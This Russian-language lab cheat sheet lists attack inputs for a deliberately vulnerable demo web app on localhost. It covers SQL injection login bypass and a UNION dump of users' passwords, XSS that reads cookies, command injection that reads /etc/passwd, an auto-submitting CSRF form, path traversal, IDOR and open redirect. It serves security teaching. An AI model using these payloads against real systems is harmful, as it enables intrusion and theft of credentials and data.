1 SQL Injection — обход входа /login →

Логин и пароль склеиваются в SQL без параметризации.

Поле «Логин»:

admin' --

Пароль — любой. Войдёте как admin.

Или без знания логина:

' OR '1'='1' --

Кавычка закрывает строку, -- комментирует проверку пароля.

2 SQL Injection — поиск /search →

Все товары сразу:

%' OR 1=1 --

UNION — утечка пользователей (логин/пароль в колонках товаров):

%' UNION SELECT id, username, password, email, role FROM users --
3 Reflected XSS /search →

В строку поиска:

<script>alert('XSS')</script>
<img src=x onerror=alert(document.cookie)>

Готовая ссылка для демо:

/search?q=<script>alert('XSS')</script>

Скрипт выполняется у того, кто открыл ссылку. Можно украсть cookie сессии.

4 Stored XSS — отзывы /product/1 →

В поле комментария:

<script>alert('Stored XSS')</script>
<img src=x onerror=alert(1)>

Сохраняется в БД и срабатывает у каждого посетителя страницы товара.

5 IDOR — чужой профиль /profile →

Войдите как alice, затем смените параметр:

/profile?id=1   → admin (+ секрет в сообщениях)
/profile?id=2   → alice
/profile?id=3   → bob

Сервер не проверяет, что id принадлежит текущему пользователю.

6 Path Traversal /download →

Обычный файл:

/download?file=catalog.txt

Выход из папки — исходник приложения:

/download?file=../app.py

В catalog.txt есть флаг: FLAG{path_traversal_works}

7 Command Injection — Ping /ping →

Windows:

127.0.0.1 & whoami
127.0.0.1 & dir

Linux / macOS:

127.0.0.1; id
127.0.0.1; cat /etc/passwd

Ввод попадает в shell=True без фильтрации.

8 CSRF — поддельный перевод /transfer →

Форма без CSRF-токена. Пока жертва залогинена, вредоносная страница может отправить перевод.

<form action="http://127.0.0.1:5000/transfer" method="POST">
  <input name="to_user" value="bob">
  <input name="amount" value="50">
</form>
<script>document.forms[0].submit()</script>
9 Unrestricted File Upload /upload →

Загрузите любой файл (нет проверки расширения). Доступ:

/uploads/имя_файла

На реальном сервере это путь к RCE (шелл).

10 Broken Access Control — админка /admin →

Войдите через SQLi (admin' --) и откройте админку — таблица пользователей с паролями.

Роль берётся из session, без сверки с БД.

11 Information Disclosure — API /api/user/1 →

Без логина откройте:

/api/user/1
/api/user/2
/api/user/3

В JSON — password, email, баланс.

Лучший «вау» для начала демо — 30 секунд.

12 Open Redirect /redirect → 
/redirect?url=https://example.com

Ссылка выглядит как доверенный сайт, но уводит на чужой домен (фишинг).
